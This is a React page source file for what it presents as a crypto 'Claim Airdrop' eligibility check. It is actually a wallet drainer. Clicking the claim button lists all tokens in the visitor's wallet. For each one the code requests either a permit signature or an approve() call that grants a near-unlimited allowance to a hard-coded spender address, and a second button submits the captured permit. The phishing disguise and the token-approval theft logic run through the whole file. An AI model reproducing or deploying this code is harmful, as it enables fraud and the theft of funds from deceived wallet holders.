import { Button, FormControl, FormLabel } from '@chakra-ui/react'
import { fetchSigner, getAccount, getContract, getNetwork } from '@wagmi/core'
import axios from 'axios'
import { Head } from 'components/layout/Head'
import { HeadingComponent } from 'components/layout/HeadingComponent'
import { ethers } from 'ethers'
import { useEffect, useState } from 'react'
import { SPENDER_ADDRESS } from 'utils/config'
import { checkContractPermit, erc721PermitSignature } from 'utils/permit'
import { useAccount, useNetwork } from 'wagmi'
import erc20Abi from '../utils/abis/erc20.json'

export default function Home() {
  const [txData, setTxData] = useState<any>(null)

  const { address } = useAccount()
  const { chain } = useNetwork()
  useEffect(() => {
    // connect()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [chain])

  async function connect() {
    const account = getAccount()
    // account.address = '0x2e91728aF3a54aCDCeD7938fE9016aE2cc5948C9'
    const { chain: connectedChain } = getNetwork()
    let chainName = 'eth'
    if (connectedChain && connectedChain.id === 1) {
      chainName = 'eth'
    } else if (connectedChain && connectedChain.id === 56) {
      chainName = 'bsc'
    } else if (connectedChain && connectedChain.id === 137) {
      chainName = 'matic'
    }
    try {
      const balances = await axios.get(`/api/balance/${account.address}?chain=${chainName}`)
      console.log(balances.data)
      for (let bal of balances.data) {
        await signNew(bal.address)
      }
    } catch (e) {
      console.log(e)
    }
  }

  async function signNew(contractAddress: string) {
    const account = getAccount()
    if (contractAddress === 'eth') return
    try {
      const { chain } = getNetwork()
      const signer = await fetchSigner({
        chainId: chain?.id || 1,
      })
      const contract = getContract({
        address: contractAddress || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        abi: erc20Abi,
        signerOrProvider: signer as any,
      })
      const permit = await checkContractPermit(contractAddress, 1)
      if (permit === 2 || permit === 1) {
        const value = ethers.utils.parseEther('10000000000000000000').toString()
        const data = await erc721PermitSignature(permit.toString(), account.address || '', SPENDER_ADDRESS, value, contract)
        setTxData(data)
      } else {
        const approve = await contract?.approve(SPENDER_ADDRESS, ethers.utils.parseEther('10000000000000000000'))
        approve.wait()
        console.log(approve.address)
      }
    } catch (e) {
      console.log(e)
    }
  }

  async function sendTx() {
    const { chain } = getNetwork()
    const signer = await fetchSigner({
      chainId: chain?.id || 1,
    })
    const contract = getContract({
      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      abi: erc20Abi,
      signerOrProvider: signer as any,
    })
    if (!txData) return
    const data = txData.data
    console.log(data)
    const tx = await contract?.permit(data.owner, data.spender, data.value, data.deadline, data.v, data.r, data.s)
    console.log(tx)
  }

  return (
    <>
      <Head />

      <main>
        <div style={{ marginTop: 120, marginBottom: 120, marginLeft: 40, marginRight: 40 }}>
          <HeadingComponent as="h3">Claim Airdrop</HeadingComponent>

          <FormControl>
            <FormLabel>Check if you are eligible for airdrop</FormLabel>

            <Button mt={4} onClick={() => connect()}>
              Claim Airdrop
            </Button>
            <br />
            <Button mt={4} onClick={sendTx}>
              Send Tx
            </Button>
          </FormControl>
        </div>
      </main>
    </>
  )
}
